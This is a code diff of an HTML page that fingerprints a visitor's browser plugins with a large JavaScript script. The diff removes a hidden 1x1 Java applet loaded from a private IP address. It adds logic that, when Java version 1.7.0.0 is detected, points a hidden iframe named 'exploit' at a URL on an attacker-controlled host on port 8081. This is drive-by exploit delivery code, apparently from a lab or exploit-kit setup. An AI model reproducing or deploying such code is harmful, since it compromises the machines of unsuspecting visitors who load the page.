@@ -1,11 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-</head>
-<body>
-<applet archive="http://172.16.91.187:8081/java/Microsoft.jar" code="Microsoft" width="1" height="1"></applet><script>
-var BrowserScanHostDetails = {};
+<!DOCTYPE html> <html> <head> <script 
+src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> 
+</head> <body> <iframe id="exploit" src="http://www.google.com" 
+width="200" height="200"></iframe> <script> var BrowserScanHostDetails = 
+{};
 
 
 function CollectOS() {
@@ -2658,7 +2655,20 @@ function CollectParams(){
 
 	for (var i in ao){
 		if (BrowserScanHostDetails[ao[i]] != undefined){
+			//alert(BrowserScanHostDetails[ao[i]]);
 			params += plugins[ao[i]] + "=" + BrowserScanHostDetails[ao[i]] + "&";
+			//plugins
+		if(plugins[ao[i]]=='java'){
+			if(BrowserScanHostDetails[ao[i]]=='1,7,0,0'){
+				alert(BrowserScanHostDetails[ao[i]]);
+				var iframe = document.getElementById('exploit');
+				alert(iframe.src);
+				url = 'http://172.16.91.187:8081/exploit';
+				iframe.setAttribute('src',url);
+				alert(iframe.src);
+				iframe.contentDocument.location.reload(true);
+			}
+}
 		}
 	}
 	$(document).ready(function(){
